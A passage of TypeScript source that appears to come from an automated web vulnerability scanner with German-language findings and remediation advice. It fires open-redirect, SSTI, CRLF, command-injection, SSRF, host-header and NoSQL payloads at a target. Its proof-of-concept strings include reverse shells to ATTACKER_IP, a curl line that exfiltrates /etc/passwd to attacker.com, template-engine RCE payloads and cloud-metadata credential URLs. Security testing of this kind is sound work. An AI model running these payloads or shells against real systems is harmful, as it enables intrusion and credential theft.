        "https://evil%E3%80%82com", "https://evil.com#@trusted.com",
      ];
      for (const link of allParamLinks.slice(0, 20)) {
        for (const param of redirectParams) {
          if (link.toLowerCase().includes(param + "=")) {
            for (const rdPayload of redirectPayloads.slice(0, 8)) {
              try {
                const testUrl = link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=${encodeURIComponent(rdPayload)}`);
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                const isRedirect = (resp.status === 301 || resp.status === 302 || resp.status === 303 || resp.status === 307 || resp.status === 308);
                const redirectsToEvil = resp.redirectUrl && (resp.redirectUrl.includes("evil.com") || resp.redirectUrl.includes("evil%"));
                const bodyReflectsEvil = respBody.includes("evil.com") || respBody.includes("javascript:alert");
                if ((isRedirect && redirectsToEvil) || bodyReflectsEvil) {
                  sendLog(`⚠ OPEN REDIRECT: ${link} via ${param}`, "REDIRECT");
                  vulnerabilities.push(createProfessionalVuln(
                    "open_redirect", "high", link,
                    `OPEN REDIRECT DETECTED via parameter '${param}' — Phishing-Angriff moglich`,
                    "Open Redirect ermoglicht Phishing (Opfer vertraut der Domain), OAuth Token Theft, Session Hijacking und Credential Harvesting",
                    "1. Redirect-URLs gegen Whitelist validieren\n2. Keine externen URLs erlauben\n3. Relative Pfade statt absolute URLs\n4. URL-Parsing mit WHATWG URL API\n5. Protocol-Whitelist (nur https://)",
                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect",
                    { payload: rdPayload, poc: `curl -v '${testUrl}'\n\n# Phishing PoC:\n<a href="${link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=https://evil-phishing-site.com/login`)}">Click here to login</a>\n\n# OAuth Token Theft:\n${baseUrl}/oauth/authorize?redirect_uri=https://evil.com/steal`, evidence: `Redirect to external domain via '${param}'.\nHTTP Status: ${resp.status}${resp.redirectUrl ? '\nLocation: ' + resp.redirectUrl : ''}${bodyReflectsEvil ? '\nEvil domain reflected in body' : ''}` }
                  ));
                  break;
                }
              } catch {}
            }
            break;
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // CORS MISCONFIGURATION CHECK
      // ─────────────────────────────────────────────────────────────────
      sendLog("CORS-Konfiguration wird gepruft...", "CORS");
      try {
        const corsResp = await fetchWithTimeout(url, {
          headers: { 'Origin': 'https://evil-attacker.com' },
        }, 5000);
        const acao = corsResp.headers?.['access-control-allow-origin'];
        const acac = corsResp.headers?.['access-control-allow-credentials'];
        if (acao && (acao === '*' || acao.includes('evil-attacker.com'))) {
          const severity = acac === 'true' ? 'high' : 'medium';
          sendLog(`⚠ CORS-Fehlkonfiguration: ${acao}`, "CORS");
          vulnerabilities.push({
            id: randomUUID(),
            type: "cors_misconfiguration",
            severity,
            url,
            description: `CORS Misconfiguration: Access-Control-Allow-Origin = ${acao}${acac === 'true' ? ' with credentials' : ''}`,
            why: "Unsichere CORS-Konfiguration ermoglicht Cross-Origin Datendiebstahl",
            solution: "CORS-Origins auf vertrauenswurdige Domains beschranken, keine Wildcards verwenden",
            reference: "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
            timestamp: new Date().toISOString(),
          });
        }
      } catch {}

      // ─────────────────────────────────────────────────────────────────
      // CLICKJACKING CHECK
      // ─────────────────────────────────────────────────────────────────
      if (!headers['x-frame-options'] && !(headers['content-security-policy'] || '').includes('frame-ancestors')) {
        sendLog(`⚠ Clickjacking moglich (kein X-Frame-Options/frame-ancestors)`, "VULN");
        vulnerabilities.push({
          id: randomUUID(),
          type: "clickjacking",
          severity: "medium",
          url,
          description: "Clickjacking moglich - keine Frame-Schutz-Header gefunden",
          why: "Angreifer konnen die Seite in einem iframe einbetten und Benutzer zu ungewollten Aktionen verleiten",
          solution: "X-Frame-Options: DENY oder SAMEONLY setzen, Content-Security-Policy: frame-ancestors 'self'",
          reference: "https://owasp.org/www-community/attacks/Clickjacking",
          timestamp: new Date().toISOString(),
        });
      }

      // ─────────────────────────────────────────────────────────────────
      // INFORMATION DISCLOSURE CHECKS
      // ─────────────────────────────────────────────────────────────────
      sendLog("Information-Disclosure wird gepruft...", "INFO");
      // Check exposed server version
      if (headers['server'] && headers['server'] !== 'Unknown') {
        const serverHeader = headers['server'] as string;
        if (serverHeader.match(/\d+\.\d+/)) {
          vulnerabilities.push({
            id: randomUUID(),
            type: "information_disclosure",
            severity: "low",
            url,
            description: `Server-Version exponiert: ${serverHeader}`,
            why: "Server-Versionen helfen Angreifern bekannte Schwachstellen zu finden",
            solution: "Server-Header entfernen oder auf generischen Wert setzen (z.B. ServerTokens Prod in Apache)",
            timestamp: new Date().toISOString(),
          });
        }
      }
      // Check for exposed X-Powered-By
      if (headers['x-powered-by']) {
        vulnerabilities.push({
          id: randomUUID(),
          type: "information_disclosure",
          severity: "low",
          url,
          description: `X-Powered-By exponiert: ${headers['x-powered-by']}`,
          why: "Technologie-Stack-Information hilft bei gezielten Angriffen",
          solution: "X-Powered-By Header entfernen",
          timestamp: new Date().toISOString(),
        });
      }
      // Check MySQL port exposed (from port scan)
      const mysqlPort = openPorts.find(p => p.port === 3306);
      if (mysqlPort) {
        sendLog(`⚠ MySQL-Port 3306 offen!`, "INFO");
        vulnerabilities.push({
          id: randomUUID(),
          type: "exposed_database",
          severity: "high",
          url: `${parsedUrl.hostname}:3306`,
          description: `MySQL/MariaDB-Datenbank offentlich erreichbar auf Port 3306${mysqlPort.banner ? ` (${mysqlPort.banner.substring(0, 50)})` : ''}`,
          why: "Offentlich erreichbare Datenbanken sind ein kritisches Sicherheitsrisiko - Brute-Force und direkte Angriffe moglich",
          solution: "MySQL nur auf localhost binden (bind-address = 127.0.0.1), Firewall-Regeln erstellen",
          reference: "https://owasp.org/www-project-web-security-testing-guide/",
          timestamp: new Date().toISOString(),
        });
      }
      // Check FTP exposed
      const ftpPort = openPorts.find(p => p.port === 21);
      if (ftpPort) {
        vulnerabilities.push({
          id: randomUUID(),
          type: "exposed_service",
          severity: "medium",
          url: `${parsedUrl.hostname}:21`,
          description: `FTP-Server offen${ftpPort.banner ? `: ${ftpPort.banner.substring(0, 60)}` : ''}`,
          why: "FTP ubertragt Zugangsdaten im Klartext und ist anfällig fur Brute-Force",
          solution: "FTP durch SFTP ersetzen oder Zugriff per Firewall einschranken",
          timestamp: new Date().toISOString(),
        });
      }
      // Check SMB exposed
      const smbPort = openPorts.find(p => p.port === 445);
      if (smbPort) {
        vulnerabilities.push({
          id: randomUUID(),
          type: "exposed_service",
          severity: "high",
          url: `${parsedUrl.hostname}:445`,
          description: `SMB-Port 445 offentlich erreichbar`,
          why: "SMB ist anfällig fur EternalBlue und andere kritische Exploits (WannaCry, NotPetya)",
          solution: "SMB-Port 445 per Firewall blockieren, nur im internen Netzwerk erlauben",
          timestamp: new Date().toISOString(),
        });
      }
      // Check NetBIOS exposed
      const netbiosPort = openPorts.find(p => p.port === 139);
      if (netbiosPort) {
        vulnerabilities.push({
          id: randomUUID(),
          type: "exposed_service",
          severity: "medium",
          url: `${parsedUrl.hostname}:139`,
          description: `NetBIOS-Port 139 offen`,
          why: "NetBIOS kann Informationen uber Netzwerk und Systeme preisgeben",
          solution: "NetBIOS per Firewall blockieren",
          timestamp: new Date().toISOString(),
        });
      }

      // ─────────────────────────────────────────────────────────────────
      // EXPANDED PORT-BASED VULNERABILITY DETECTION
      // ─────────────────────────────────────────────────────────────────
      for (const port of openPorts) {
        const dangerousPort = DANGEROUS_PORTS[port.port];
        if (dangerousPort && ![21, 139, 445, 3306].includes(port.port)) {
          const portType = [3306, 5432, 1521, 1433, 27017, 6379, 9200].includes(port.port) ? "exposed_database" : "exposed_service";
          sendLog(`⚠ ${dangerousPort.service} auf Port ${port.port} offen!`, "PORT");
          vulnerabilities.push(createProfessionalVuln(
            portType, dangerousPort.severity, `${parsedUrl.hostname}:${port.port}`,
            `${dangerousPort.service} offentlich erreichbar (Port ${port.port})`,
            dangerousPort.description,
            `Port ${port.port} per Firewall schliessen, nur in internem Netzwerk/VPN erlauben`,
            "https://owasp.org/www-project-web-security-testing-guide/",
            { poc: dangerousPort.exploitation, evidence: `Port ${port.port} open${port.banner ? ': ' + port.banner.substring(0, 80) : ''}` }
          ));
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // SSTI TESTING — SERVER-SIDE TEMPLATE INJECTION
      // ─────────────────────────────────────────────────────────────────
      sendLog("SSTI-Tests werden durchgefuhrt...", "SSTI");
      const sstiDetectPatterns = [
        { payload: "{{7*7}}", expected: "49" },
        { payload: "{{7*'7'}}", expected: "7777777" },
        { payload: "${7*7}", expected: "49" },
        { payload: "<%= 7*7 %>", expected: "49" },
        { payload: "#{7*7}", expected: "49" },
        { payload: "${1234*2}", expected: "2468" },
        { payload: "{{1234*2}}", expected: "2468" },
        { payload: "@(1234+1234)", expected: "2468" },
        { payload: "*{7*7}", expected: "49" },
        { payload: "%{7*7}", expected: "49" },
      ];
      // Also use full SSTI_PAYLOADS for deep detection
      const sstiInfoPatterns = ["jinja2", "twig", "freemarker", "smarty", "mako", "django", "velocity", "thymeleaf", "__class__", "__mro__", "__subclasses__", "subprocess", "popen"];
      for (const link of allParamLinks.slice(0, 20)) {
        let sstFound = false;
        // Phase 1: Math detection
        for (const test of sstiDetectPatterns) {
          if (sstFound) break;
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(test.payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            if (respBody.includes(test.expected) && !respBody.includes(test.payload)) {
              sendLog(`⚠ SSTI ERKANNT: ${link} — Payload ${test.payload} → ${test.expected}`, "SSTI");
              vulnerabilities.push(createProfessionalVuln(
                "ssti", "critical", link,
                `SERVER-SIDE TEMPLATE INJECTION! ${test.payload} evaluated to ${test.expected}`,
                "SSTI ermoglicht Remote Code Execution uber Template-Engines (Jinja2, Twig, FreeMarker, Smarty, ERB, Thymeleaf, Velocity). Ein Angreifer kann beliebigen Code auf dem Server ausfuhren, Dateien lesen, Reverse Shells offnen und das System vollstandig ubernehmen.",
                "1. Keine User-Eingaben in Templates\n2. Template-Sandboxing aktivieren\n3. Logicless Templates verwenden (Mustache/Handlebars)\n4. WAF-Regeln fur Template-Syntax\n5. Template-Rendering isolieren (Container/Sandbox)",
                "https://portswigger.net/research/server-side-template-injection",
                { payload: test.payload, poc: `# TEUFEL SHIELD — SSTI PoC\ncurl -v '${testUrl}'\n\ntplmap -u '${link}'\n\n# Jinja2 RCE:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Twig RCE:\n{{['id']|filter('system')}}\n\n# FreeMarker RCE:\n<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}\n\n# Smarty RCE:\n{php}echo \\x60id\\x60;{/php}`, evidence: `Expression ${test.payload} evaluated to ${test.expected}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
              ));
              sstFound = true;
            }
          } catch {}
        }
        // Phase 2: Deep SSTI payloads for error-based detection
        if (!sstFound) {
          for (const payload of SSTI_PAYLOADS.slice(0, 15)) {
            if (sstFound) break;
            try {
              const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
              const resp = await fetchWithTimeout(testUrl, {}, 8000);
              const respBody = (resp.body || '').toLowerCase();
              if (sstiInfoPatterns.some(p => respBody.includes(p))) {
                sendLog(`⚠ SSTI (error-based): ${link}`, "SSTI");
                vulnerabilities.push(createProfessionalVuln(
                  "ssti", "high", link,
                  `POTENTIAL SSTI — Template engine information leaked`,
                  "Template-Engine-Information in Response deutet auf potenzielle SSTI-Schwachstelle hin",
                  "Template-Rendering von User-Eingaben isolieren",
                  "https://portswigger.net/research/server-side-template-injection",
                  { payload, poc: `# TEUFEL SHIELD — SSTI PoC\ncurl -v '${testUrl}'\ntplmap -u '${link}'`, evidence: `Template engine info detected with: ${payload}\n\nResponse excerpt:\n${(resp.body || '').substring(0, 500)}`, responseSample: (resp.body || '').substring(0, 500) }
                ));
                sstFound = true;
              }
            } catch {}
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // CRLF INJECTION TESTING
      // ─────────────────────────────────────────────────────────────────
      sendLog("CRLF-Injection-Tests werden durchgefuhrt...", "CRLF");
      for (const link of allParamLinks.slice(0, 15)) {
        for (const payload of CRLF_PAYLOADS.slice(0, 10)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 6000);
            const respHeaders = resp.headers || {};
            const bodySnippet = (resp.body || '').substring(0, 300);
            if (respHeaders['x-injected'] || respHeaders['set-cookie']?.includes('crlf') || respHeaders['injected-header']) {
              sendLog(`⚠ CRLF INJECTION: ${link}`, "CRLF");
              vulnerabilities.push(createProfessionalVuln(
                "crlf_injection", "high", link,
                `CRLF INJECTION DETECTED — HTTP Header Injection moglich — Payload: ${payload}`,
                "CRLF Injection erlaubt HTTP Response Splitting, Session Fixation, XSS uber injizierte Header, Cache Poisoning und Redirect-Angriffe. Ein Angreifer kann beliebige HTTP-Header und sogar einen kompletten HTTP-Response-Body injizieren.",
                "1. \\r\\n Zeichen in allen HTTP-Header-Werten filtern/encodieren\n2. URL-Encoding fur alle dynamischen Header-Werte\n3. Web-Framework-eigene Response-Builder verwenden\n4. WAF-Regeln fur CRLF-Sequenzen",
                "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
                { payload, poc: `# TEUFEL SHIELD — CRLF Injection PoC\ncurl -v '${testUrl}'\n\n# Session Fixation:\n?param=%0d%0aSet-Cookie:%20SESSIONID=attacker_session\n\n# XSS via Header:\n?param=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('XSS')</script>\n\n# HTTP Response Splitting:\n?param=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Injected</html>`, evidence: `Injected header detected in response\nPayload: ${payload}\n\nHeaders: ${JSON.stringify(respHeaders).substring(0, 300)}`, responseSample: bodySnippet }
              ));
              break;
            }
          } catch {}
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // COMMAND INJECTION TESTING
      // ─────────────────────────────────────────────────────────────────
      sendLog("Command-Injection-Tests werden durchgefuhrt...", "CMD");
      const cmdParams = ["cmd", "exec", "command", "ping", "query", "jump", "code", "reg", "do", "func", "arg", "option", "load", "process", "step", "read", "feature", "exe", "module", "payload", "run", "print", "ip", "host", "hostname", "target", "daemon", "upload", "dir", "log", "download", "email", "to", "from", "src", "data"];
      for (const link of allParamLinks.slice(0, 20)) {
        const hasCmdParam = cmdParams.some(p => link.toLowerCase().includes(p + "="));
        if (!hasCmdParam) continue;
        sendLog(`Teste CMD: ${link}`, "CMD");
        for (const payload of CMD_PAYLOADS.slice(0, 20)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            if (respBody.includes("uid=") || respBody.includes("root:x:") || 
                respBody.includes("Linux") || respBody.includes("Directory of") ||
                respBody.match(/uid=\d+\(/) || respBody.match(/total \d+\n/) ||
                respBody.includes("www-data") || respBody.includes("bin/bash") ||
                respBody.includes("apache") || respBody.includes("Volume Serial")) {
              sendLog(`⚠ COMMAND INJECTION: ${link}`, "CMD");
              vulnerabilities.push(createProfessionalVuln(
                "command_injection", "critical", link,
                `OS COMMAND INJECTION DETECTED! Systembefehl wurde ausgefuhrt — Payload: ${payload}`,
                "OS Command Injection ermoglicht vollstandige Serverubernahme, Reverse Shell, Datendiebstahl, Pivoting ins interne Netzwerk und Deployment von Malware/Ransomware.",
                "1. Keine OS-Befehle mit User-Eingaben\n2. escapeshellarg()/escapeshellcmd() verwenden\n3. Sandboxing/Container-Isolation\n4. Whitelist fur erlaubte Befehle\n5. seccomp/AppArmor Profile",
                "https://owasp.org/www-community/attacks/Command_Injection",
                { payload, poc: `# TEUFEL SHIELD — Command Injection PoC\ncurl -v '${testUrl}'\n\n# System Info:\n;cat /etc/passwd\n;uname -a\n;whoami\n;id\n\n# Reverse Shell:\n;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n;python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n\n# Data Exfiltration:\n;curl https://attacker.com/exfil?d=$(cat /etc/passwd|base64)`, evidence: `System output detected with payload: ${payload}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
              ));
              break;
            }
          } catch {}
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // SSRF TESTING
      // ─────────────────────────────────────────────────────────────────
      sendLog("SSRF-Tests werden durchgefuhrt...", "SSRF");
      const ssrfParams = ["url", "link", "src", "redirect", "uri", "path", "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return", "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", "open", "file", "document", "folder", "pg", "style", "pdf", "template", "php_path", "doc"];
      for (const link of allParamLinks.slice(0, 20)) {
        const hasSsrfParam = ssrfParams.some(p => link.toLowerCase().includes(p + "="));
        if (!hasSsrfParam) continue;
        sendLog(`Teste SSRF: ${link}`, "SSRF");
        for (const payload of SSRF_PAYLOADS.slice(0, 15)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 8000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            if (respBody.includes("root:") || respBody.includes("ami-") || 
                respBody.includes("instance-id") || respBody.includes("meta-data") ||
                respBody.includes("security-credentials") || respBody.includes("AccessKeyId") ||
                respBody.includes("iam/") || respBody.includes("compute/metadata") ||
                respBody.includes("169.254.169.254") || respBody.includes("metadata.google") ||
                (payload.includes("localhost") && resp.status === 200 && respBody.length > 0 && !respBody.includes("not found"))) {
              sendLog(`⚠ SSRF ERKANNT: ${link}`, "SSRF");
              vulnerabilities.push(createProfessionalVuln(
                "ssrf", "critical", link,
                `SERVER-SIDE REQUEST FORGERY — Interner Zugriff moglich — Payload: ${payload}`,
                "SSRF ermoglicht Zugriff auf interne Dienste, Cloud-Metadaten (AWS IAM Credentials, GCP Service-Accounts, Azure IMDS), interne APIs, Datenbanken und Netzwerk-Scanning. Bei AWS kann dies zu vollstandiger Cloud-Account-Ubernahme fuhren.",
                "1. URL-Whitelist implementieren\n2. Interne IPs/RFC1918 blockieren\n3. DNS-Rebinding-Schutz\n4. Netzwerk-Segmentierung\n5. IMDS v2 erzwingen (AWS)\n6. Egress-Firewall konfigurieren",
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                { payload, poc: `# TEUFEL SHIELD — SSRF PoC\ncurl -v '${testUrl}'\n\n# AWS Metadata (IAM Credentials):\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP Metadata:\n?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\n# Azure IMDS:\n?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n# Internal Port Scan:\n?url=http://127.0.0.1:6379/\n?url=http://127.0.0.1:3306/\n?url=http://127.0.0.1:8080/admin\n\n# File Read:\n?url=file:///etc/passwd`, evidence: `Internal resource accessed via SSRF payload: ${payload}\n\nResponse excerpt:\n${bodySnippet}`, responseSample: bodySnippet }
              ));
              break;
            }
          } catch {}
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // HOST HEADER INJECTION TESTING (ENTERPRISE-GRADE)
      // ─────────────────────────────────────────────────────────────────
      sendLog("Host-Header-Injection (Enterprise) wird gepruft...", "HOST");
      const hostPayloads = [
        { headers: { 'Host': 'evil-teufel.com' }, detect: 'evil-teufel.com', name: 'Host Header Override' },
        { headers: { 'X-Forwarded-Host': 'evil-teufel.com' }, detect: 'evil-teufel.com', name: 'X-Forwarded-Host' },
        { headers: { 'X-Original-URL': '/admin' }, detect: 'admin', name: 'X-Original-URL Override' },
        { headers: { 'X-Rewrite-URL': '/admin' }, detect: 'admin', name: 'X-Rewrite-URL Override' },
        { headers: { 'X-Forwarded-For': '127.0.0.1' }, detect: '127.0.0.1', name: 'X-Forwarded-For Spoofing' },
        { headers: { 'Host': 'evil-teufel.com', 'X-Forwarded-Host': 'evil-teufel.com', 'X-Host': 'evil-teufel.com' }, detect: 'evil-teufel.com', name: 'Multi-Header Host Injection' },
        { headers: { 'Host': `${parsedUrl.hostname}\r\nX-Injected: true` }, detect: 'X-Injected', name: 'CRLF in Host Header' },
      ];
      // Test on main URL
      for (const hPayload of hostPayloads) {
        try {
          const hostResp = await fetchWithTimeout(url, { headers: hPayload.headers }, 6000);
          const hostBody = hostResp.body || '';
          const bodySnippet = hostBody.substring(0, 500);
          if (hostBody.includes(hPayload.detect)) {
            sendLog(`⚠ HOST HEADER INJECTION: ${hPayload.name}`, "HOST");
            vulnerabilities.push(createProfessionalVuln(
              "host_header_injection", "high", url,
              `HOST HEADER INJECTION — ${hPayload.name} accepted by server`,
              "Host Header Injection ermoglicht Password-Reset-Poisoning, Cache Poisoning, Web Cache Deception, und SSRF uber Reverse Proxies",
              "1. Host-Header serverseitig validieren (Whitelist)\n2. X-Forwarded-Host nur von vertrauenswurdigen Reverse Proxies\n3. Absolute URLs in Password-Reset-Links\n4. Cache-Key normalisieren",
              "https://portswigger.net/web-security/host-header",
              { payload: JSON.stringify(hPayload.headers), poc: `curl -v ${Object.entries(hPayload.headers).map(([k,v]) => `-H "${k}: ${v}"`).join(' ')} "${url}"\n\n# Password Reset Poisoning PoC:\ncurl -X POST '${baseUrl}/reset-password' -H 'Host: evil-teufel.com' -d 'email=victim@target.com'\n# (Reset link wird an evil-teufel.com gesendet)`, evidence: `'${hPayload.detect}' reflected in response after ${hPayload.name}.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
            ));
          }
        } catch {}
      }
      // Also test password reset endpoint specifically
      const resetPaths = ['/reset-password', '/forgot-password', '/password/reset', '/api/auth/reset', '/users/password', '/account/recover'];
      for (const resetPath of resetPaths) {
        try {
          const resetUrl = `${baseUrl}${resetPath}`;
          const resp = await fetchWithTimeout(resetUrl, {
            method: 'POST',
            headers: { 'Host': 'evil-teufel.com', 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'email=test@test.com',
          }, 5000);
          if (resp.status !== 404 && resp.status !== 405) {
            const respBody = resp.body || '';
            if (respBody.includes('evil-teufel.com') || respBody.includes('reset') || respBody.includes('email')) {
              sendLog(`⚠ PASSWORD RESET POISONING: ${resetUrl}`, "HOST");
              vulnerabilities.push(createProfessionalVuln(
                "host_header_injection", "critical", resetUrl,
                `PASSWORD RESET POISONING — Host Header in Reset-Link akzeptiert`,
                "Angreifer kann Password-Reset-Links auf eigene Domain umleiten und Tokens stehlen",
                "1. Absolute URLs mit fest konfigurierter Domain verwenden\n2. Host Header ignorieren fur Link-Generierung\n3. Reset-Token Expiry auf 15min setzen",
                "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning",
                { poc: `curl -X POST '${resetUrl}' -H 'Host: evil-teufel.com' -d 'email=victim@bank.com'`, evidence: `Password reset endpoint accepts manipulated Host header` }
              ));
            }
          }
        } catch {}
      }

      // ─────────────────────────────────────────────────────────────────
      // CSRF TOKEN CHECK
      // ─────────────────────────────────────────────────────────────────
      sendLog("CSRF-Schutz wird gepruft...", "CSRF");
      if (siteStructure && siteStructure.allForms.length > 0) {
        const postForms = siteStructure.allForms.filter(f => f.method === 'POST');
        for (const form of postForms.slice(0, 10)) {
          const hasCSRF = form.inputs.some(i => 
            i.name.toLowerCase().includes('csrf') || i.name.toLowerCase().includes('token') ||
            i.name.toLowerCase().includes('_token') || i.name === '__RequestVerificationToken' ||
            i.name === 'authenticity_token' || i.name === 'csrfmiddlewaretoken'
          );
          if (!hasCSRF) {
            sendLog(`⚠ CSRF-Token fehlt: ${form.action}`, "CSRF");
            vulnerabilities.push(createProfessionalVuln(
              "csrf", "high", form.action,
              `CSRF-Token fehlt in POST-Formular`,
              "Ohne CSRF-Token konnen Angreifer authentifizierte Benutzer zu ungewollten Aktionen zwingen (Geldtransfers, Passwort-Anderungen)",
              "1. CSRF-Tokens in alle State-Changing Requests einbinden\n2. SameSite Cookie-Flag setzen\n3. Origin/Referer Header Validation",
              "https://owasp.org/www-community/attacks/csrf",
              { poc: `<form action="${form.action}" method="POST">\n  <input type="hidden" name="${form.inputs[0]?.name || 'param'}" value="malicious">\n  <script>document.forms[0].submit()</script>\n</form>`, evidence: `POST form at ${form.action} has no CSRF token` }
            ));
          }
        }
      }

      // ─────────────────────────────────────────────────────────────────
      // SENSITIVE FILE & GIT EXPOSURE CHECK
      // ─────────────────────────────────────────────────────────────────
      sendLog("Kritische Dateien werden gepruft...", "FILES");
      const criticalFiles = [".env", ".git/config", ".git/HEAD", ".gitignore", "phpinfo.php", "info.php", "debug.php", ".htpasswd", ".htaccess",
        "wp-config.php.bak", "config.php.bak", "web.config", "swagger.json", "swagger.yaml", "graphql", "Dockerfile", "docker-compose.yml",
        "dump.sql", "database.sql", "backup.sql", ".DS_Store", "credentials.xml", "secrets.yml"];
      for (const file of criticalFiles) {
        try {
          const fileUrl = `${baseUrl}/${file}`;
          const resp = await fetchWithTimeout(fileUrl, {}, 5000);
          if (resp.status === 200 && resp.body && resp.body.length > 10) {
            const bodyLower = resp.body.toLowerCase();
            // Verify it's real content, not generic 404/error page
            if (bodyLower.includes("<!doctype") || bodyLower.includes("<html") || bodyLower.includes("not found") || bodyLower.includes("404")) continue;
            
            let vulnType = "sensitive_files";
            let severity: "critical" | "high" | "medium" = "high";
            
            if (file.startsWith(".git")) {
              vulnType = "git_exposure";
              severity = "critical";
            } else if (file === ".env") {
              vulnType = "env_exposure";
              severity = "critical";
            } else if (file.includes("sql") || file.includes("dump") || file.includes("backup")) {
              vulnType = "backup_files";
              severity = "high";
            } else if (file === "swagger.json" || file === "swagger.yaml" || file === "graphql") {
              vulnType = "information_disclosure";
              severity = "medium";
            }
            
            sendLog(`⚠ KRITISCHE DATEI: ${fileUrl}`, "FILES");
            vulnerabilities.push(createProfessionalVuln(
              vulnType, severity, fileUrl,
              `Sensitive Datei offentlich zuganglich: ${file}`,
              VULN_DATABASE[vulnType]?.impact || "Credential-Offenlegung, Source Code Leak, Datenbank-Zugriff",
              VULN_DATABASE[vulnType]?.remediation || "Zugriff auf sensitive Dateien per Web-Server blockieren",
              VULN_DATABASE[vulnType]?.reference || "https://owasp.org/www-project-web-security-testing-guide/",
              { poc: `curl -v "${fileUrl}"`, evidence: `File ${file} returned ${resp.body.length} bytes (HTTP ${resp.status})` }
            ));
          }
        } catch {}
      }

      // ─────────────────────────────────────────────────────────────────
      // NOSQL INJECTION TESTING (ENTERPRISE-GRADE)
      // ─────────────────────────────────────────────────────────────────
      sendLog("NoSQL-Injection-Tests (Enterprise) werden durchgefuhrt...", "NOSQL");
      const nosqlParams = ["id", "user", "username", "email", "search", "query", "filter", "name", "login", "password", "token", "q", "category", "type", "status", "role", "account", "profile"];
      const nosqlDetectPatterns = [
        "MongoError", "mongoose", "CastError", "$where", "MongoServerError", "MongoNetworkError",
        "BSONTypeError", "MongoDB", "mongo", "DocumentNotFoundError", "ValidationError",
        "E11000", "duplicate key", "WriteError", "CouchDB", "Redis", "redis",
        "SyntaxError: Unexpected token", "BadValue", "unknown operator", "OperationFailure",
        "Command failed", "errmsg", "codeName", "ns not found"
      ];
      // Phase 1: Query parameter injection
      for (const link of allParamLinks.slice(0, 20)) {
        for (const payload of NOSQL_PAYLOADS.slice(0, 15)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 6000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            const detected = nosqlDetectPatterns.some(p => respBody.includes(p));
            if (detected) {
              const matchedPattern = nosqlDetectPatterns.find(p => respBody.includes(p)) || '';
              sendLog(`⚠ NoSQL INJECTION: ${link} [${matchedPattern}]`, "NOSQL");
              vulnerabilities.push(createProfessionalVuln(
                "nosql_injection", "critical", link,
                `NoSQL INJECTION DETECTED — ${matchedPattern} in Response`,
                "NoSQL Injection ermoglicht Authentication Bypass, vollstandige Datenexfiltration und Server-Kompromittierung in MongoDB/CouchDB/Redis",
                "1. Input-Validierung mit Whitelist\n2. Mongoose Schema-Validation (strict mode)\n3. Keine User-Input in $where/$eval\n4. MongoDB RBAC aktivieren\n5. Query-Parameterisierung nutzen",
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                { payload, poc: `curl -v '${testUrl}'\n\n# Auth Bypass PoC:\ncurl -X POST '${baseUrl}/login' -H 'Content-Type: application/json' -d '{"username":{"$ne":""},"password":{"$ne":""}}'"\n\n# Data Exfiltration:\ncurl '${baseUrl}/api/users?filter[$gt]=&filter[$regex]=.*'`, evidence: `NoSQL error pattern '${matchedPattern}' detected.\nResponse excerpt: ${bodySnippet}`, responseSample: bodySnippet }
              ));
              break;
            }
          } catch {}
        }
      }
      // Phase 2: JSON body NoSQL operator injection on forms/API endpoints
      const nosqlJsonPayloads = [
        '{"$gt":""}', '{"$ne":"invalid"}', '{"$regex":".*"}', '{"$exists":true}',
        '{"$where":"sleep(3000)"}', '{"$or":[{},{"a":"a"}]}', '{"$nin":[]}',
      ];
      if (siteStructure) {
